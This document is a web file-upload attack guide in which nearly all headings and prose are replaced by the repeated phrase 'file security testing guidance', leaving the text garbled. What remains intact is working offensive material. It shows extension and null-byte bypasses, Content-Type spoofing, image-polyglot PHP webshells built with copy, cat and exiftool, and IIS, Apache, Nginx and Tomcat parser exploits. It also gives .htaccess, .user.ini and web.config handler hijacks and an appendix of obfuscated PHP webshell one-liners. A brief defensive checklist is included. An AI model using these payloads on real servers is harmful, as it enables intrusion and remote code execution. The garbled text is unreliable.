# Web file security testing guidance - file security testing guidance

> file security testing guidance: WooYun file security testing guidance | file security testing guidance web-file-infra.md

## file security testing guidance、file security testing guidance

### 1.1 file security testing guidance

```
file security testing guidance: file security testing guidance → file security testing guidance → file security testing guidance → file security testing guidance → Webshellfile security testing guidance
file security testing guidance = P(file security testing guidance) × P(file security testing guidance) × P(file security testing guidance)
```

file security testing guidance: file security testing guidance(file security testing guidance) vs file security testing guidance(file security testing guidance)。file security testing guidance"file security testing guidance"，file security testing guidance。

### 1.2 file security testing guidance

| file security testing guidance | file security testing guidance | file security testing guidance | file security testing guidance |
|-----------|------|------|---------|
| file security testing guidance | 42% | file security testing guidance | `/fckeditor/`, `/ewebeditor/`, `/ueditor/` |
| file security testing guidance | 18% | file security testing guidance | `/upload/avatar/`, `/member/uploadfile/` |
| file security testing guidance/file security testing guidance | 15% | file security testing guidance | `/uploads/`, `/attachment/` |
| file security testing guidance | 12% | file security testing guidance | `/admin/upload/`, `/system/upload/` |
| file security testing guidance | 5% | file security testing guidance | `/import/`, `/excelUpload/` |

file security testing guidance:

| file security testing guidance | file security testing guidance | file security testing guidance |
|-------|---------|---------|
| FCKeditor | `/FCKeditor/editor/filemanager/browser/default/connectors/test.html` | `/connectors/jsp/connector` |
| eWebEditor | `/ewebeditor/admin/default.jsp` | `/uploadfile/` |
| UEditor | `/ueditor/controller.jsp action=config` | `/ueditor/controller.jsp` |

### 1.3 file security testing guidance - file security testing guidance

file security testing guidance:

| file security testing guidance | PHP | ASP/ASPX | JSP |
|-----|-----|----------|-----|
| file security testing guidance | `.Php .pHp` | `.Asp .aSp` | `.Jsp .jSp` |
| file security testing guidance | `.pphphp` | `.asaspp` | `.jsjspp` |
| file security testing guidance | `.php3 .php5 .phtml .phar` | `.asa .cer .cdx` | `.jspx .jspa` |
| file security testing guidance/file security testing guidance | `.php .` | `.asp.` | `.jsp.` |
| ::$DATA | N/A | `.asp::$DATA` | N/A |
| %00file security testing guidance | `.php%00.jpg` | `.asp%00.jpg` | `.jsp%00.jpg` |
| file security testing guidance(IIS) | N/A | `.asp;.jpg` | N/A |
| file security testing guidance(Apache) | `.php\x0a` | N/A | N/A |

file security testing guidance:

| file security testing guidance | file security testing guidance | file security testing guidance |
|-----|------|------|
| file security testing guidance | file security testing guidance | IIS/Apache/Nginxfile security testing guidance |
| Apachefile security testing guidance | `shell.php.jpg` file security testing guidancephp | Apachefile security testing guidance |
| %00file security testing guidance | `shell.php%00.jpg` | PHP < 5.3.4 |
| file security testing guidance | file security testing guidance`.htaccess`/`.user.ini` | file security testing guidancetxt/file security testing guidance |
| file security testing guidance+LFI | file security testing guidance | file security testing guidanceLFIfile security testing guidance |

### 1.4 file security testing guidance - MIME/Content-Type

```
file security testing guidanceContent-Typefile security testing guidance:
image/jpeg | image/gif | image/png | image/bmp
application/octet-stream (file security testing guidance)

Burpfile security testing guidance:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    <-- file security testing guidance
```

### 1.5 file security testing guidance - file security testing guidance/file security testing guidance

file security testing guidanceMagic Number:

| file security testing guidance | Magic Number(Hex) | ASCII |
|-----|-------------------|-------|
| JPEG | `FF D8 FF` | file security testing guidanceASCII |
| PNG | `89 50 4E 47` | .PNG |
| GIF | `47 49 46 38` | GIF8 |
| BMP | `42 4D` | BM |
| PDF | `25 50 44 46` | %PDF |
| ZIP | `50 4B 03 04` | PK.. |

file security testing guidance:

```bash
# file security testing guidance1: file security testing guidance
GIF89a< php system($_POST['cmd']);  >

# file security testing guidance2: file security testing guidance
copy /b image.gif+shell.php shell.gif      # Windows
cat image.gif shell.php > shell.gif         # Linux

# file security testing guidance3: EXIFfile security testing guidance
exiftool -Comment='< php system($_GET["cmd"]);  >' image.jpg
```

### 1.6 Webfile security testing guidance

```
IIS 5.x/6.0:
  file security testing guidance: /shell.asp/1.jpg     -> file security testing guidanceASP
  file security testing guidance: shell.asp;.jpg       -> file security testing guidanceASP
  file security testing guidance: shell.asp.jpg        -> file security testing guidanceASP

Apache:
  file security testing guidance: shell.php.xxx          -> file security testing guidance
  .htaccess: AddType application/x-httpd-php .jpg
  file security testing guidance: shell.php%0a         -> CVE-2017-15715

Nginx:
  file security testing guidance: /1.jpg/shell.php     -> cgi.fix_pathinfo=1
  file security testing guidance: shell.jpg%00.php       -> file security testing guidance

Tomcat:
  PUTfile security testing guidance: PUT /shell.jsp/       -> CVE-2017-12615
```

### 1.7 file security testing guidance

```apache
# .htaccess: file security testing guidancejpgfile security testing guidancePHP
<FilesMatch "\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>
```

```ini
# .user.ini (PHP-FPM): file security testing guidance
auto_prepend_file=/var/www/html/uploads/shell.jpg
```

```xml
<!-- web.config (IIS): file security testing guidancejpgfile security testing guidanceFastCGIfile security testing guidance -->
<handlers>
  <add name="PHP" path="*.jpg" verb="*" modules="FastCgiModule"
       scriptProcessor="C:\php\php-cgi.exe" resourceType="Unspecified" />
</handlers>
```

### 1.8 file security testing guidance

```
file security testing guidance: file security testing guidance
file security testing guidance: file security testing guidance+file security testing guidance,file security testing guidance
file security testing guidance: file security testing guidance,file security testing guidance
```

### 1.9 file security testing guidance

1. file security testing guidance: file security testing guidance(`.jpg .png .gif .pdf`)
2. file security testing guidance: file security testing guidance + MIME(finfo_file) + file security testing guidance + getimagesize()
3. file security testing guidance: `uniqid() + file security testing guidance`，file security testing guidance
4. file security testing guidance: file security testing guidance
5. file security testing guidance: `chmod 0644`，Webfile security testing guidance
6. file security testing guidance: file security testing guidance，file security testing guidance
7. file security testing guidance: file security testing guidance，file security testing guidanceCDNfile security testing guidanceURL

---


---
## file security testing guidance: Webshell file security testing guidance

## file security testing guidanceB: Webshellfile security testing guidance

```php
$a = 'as'.'sert'; $a($_POST['x']);                    // file security testing guidance
array_map('ass'.'ert', array($_POST['x']));            // file security testing guidance
$f = create_function('', $_POST['x']); $f();           // file security testing guidance
set_exception_handler('system');                        // file security testing guidance
throw new Exception($_POST['cmd']);
```

